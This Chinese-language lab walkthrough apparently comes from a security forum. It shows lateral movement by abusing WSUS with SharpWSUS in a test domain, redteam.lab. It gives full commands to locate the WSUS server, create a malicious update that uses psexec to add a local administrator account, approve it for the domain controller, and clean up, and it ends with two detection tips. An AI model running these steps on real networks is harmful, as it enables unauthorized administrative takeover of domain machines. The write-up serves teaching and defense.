### Tags: 认证面攻击

WSUS是微软在其网络结构中提供的关于系统补丁更新的一个解决方案，在一些规模较大的域可能会出现。

WSUS可以在域内机器不出网的时候，将客户端绑定到WSUS Server上，将一些补丁或者组件更新时直接放到WSUS Server，通过 HTTP （8530端口）和 HTTPS （8531端口）与 Microsoft 通信来加载补丁，然后推到指定的域机器上，方便运维进行管理。

最常见的情况是单域采用一台WSUS更新服务器进行管理，下图是域内单台WSUS的架构图：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-a05747d8fd98d274b679e9e5a4a69c3477e08111.png)

下图是域内多台WSUS的架构图：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-2ee4f4ddc7fd3807275a00e4e78852f87d223a23.png)

0x01 利用
=======

通过SharpWSUS枚举WSUS信息、推送恶意补丁到目标机器进行横向渗透。

0x02 实验环境：
==========

```php
域名：redteam.lab  
​  
1.域内WSUS服务器server2019（机器名：WSUS-1）  
​  
2.域内域控Server2016（机器名：DC2）  
​  
2.域内机器win7（机器名：dm2007）
```

当前环境是拿到了域内win7的权限，然后通过WSUS Server进行横向渗透

定位当前主机WSUS Server
-----------------

1.通过注册表

```php
HKEY\_LOCAL\_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-73f02b6eae63c36ece4b337ddd4cefd2d3dfd774.png)

2.通过SharpWSUS

```php
SharpWSUS.exe locate
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-76f2dc3b51d457f079c81151580cb6736ac0908d.png)  
由上面的信息收集，可以得到WSUS Server机器名为WSUS-1，然后我们想方设法获得了WSUS-1的机器权限。

- - - - - -

通过WSUS-1枚举WSUS服务的详细信息：

其中包括当前管理的计算机列表、ip、版本信息、上一次更新的时间

```php
SharpWSUS.exe inspect
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-397452c66d1c1a0a39a84b058620699fe2a927d1.png)

可以看到域控（DC2）也在这台WSUS Server 更新的目标内，可以向它推送恶意更新，例如：添加本地管理员用户。

要点
--

1.WSUS横向最不确定的因素是无法控制客户端何时向WSUS Server拉取补丁信息，这个属性通常在域内搭建WSUS的组策略中设置。利用成功与否决定于客户端安装了攻击者提供的恶意补丁。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-92f8353656c72bb1b0f25f8f19b4e6169f37e909.png)

2.WSUS的有效负载必须是Microsoft 签名的二进制文件，并且必须指向磁盘上的某个位置，使 WSUS Server指向该二进制文件。由于需要签名的二进制文件，可以用PsExec.exe 以 SYSTEM 身份执行、RunDLL32在网络共享上运行恶意 DLL等方法进行横向，下面以psexec举例。

横向
--

1.生成一个用psexec执行添加本地管理员组的恶意补丁，其中updateid是补丁的更新id

```php
SharpWSUS.exe create /payload:"C:\\Users\\public\\psexec.exe" /args:"-accepteula -s -d cmd.exe /c 'net user lzz Qq123456.. /add && net localgroup administrators lzz /add'" /title:"demo01"
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-c348a21070d20c83e9c716064bb7109c1d9ffd8a.png)

随着补丁生成，补丁中的二进制文件（psexec.exe）也被保存在WSUS目录中并命名为wuagent.exe

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-ab1d49faf2ae14224e7b85540b810e805eebc945.png)

2.因为WSUS根据组进行管理，所以创建组Demos并将DC2加入Demos，设置恶意补丁作用于Demos

```php
SharpWSUS.exe approve /updateid:ac82689b-f451-4df5-bc1c-3cb653301252 /computername:dc2.redteam.lab /groupname:"Demos"
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-17917c6b8f56cd9a9ec6fe9994c01e7e937d7229.png)

在WSUS Server上也能看到补丁的详细信息

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-190f7cee4764ba4933c9b5698a90d96ce0d041af.png)

3.检查组是否创建

```php
SharpWSUS.exe inspect
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-3b2554f682ce5d3c0d708d4f894b310deaf95d94.png)

同样能在WSUS Server上看到

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-a26e9da9446efcc18dd9c45d5df2dea166e600b4.png)

获取更新状态

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-a83f61ac09d127007f25f351b8c76e4e31982adb.png)

由于开始搭建组策略的时候设置了每天三点客户端更新，到了三点以后可以看到WSUS Server将demo01推送到了dc2上

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-efde9b5e12dac619d3b04baeb16f6175f2483b98.png)

dc2安装更新后，恶意补丁成功创建了本地管理员账户。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-bb245cf978efca500656b3e329cdcb8e2065ec3a.png)

攻击利用成功后，同样利用SharpWSUS删除恶意补丁

```php
SharpWSUS.exe delete /updateid:ac82689b-f451-4df5-bc1c-3cb653301252 /computername:dc2.redteam.lab /groupname:”Demos”
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-d934a481accd4fb2cef8584ac622eb6760878718.png)

可以看到Demos组和id为ac82689b-f451-4df5-bc1c-3cb653301252的补丁demo01被删除。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-3ac72b1202f56991e7e814827c4e0d20bcf355ca.png)

0x03 防范措施
=========

1.最后攻击者成功后wuagent.exe不会被自动删除，可以利用此进行溯源

2.攻击利用会创建新的WSUS组，可以随时监控组的创建和删除定位攻击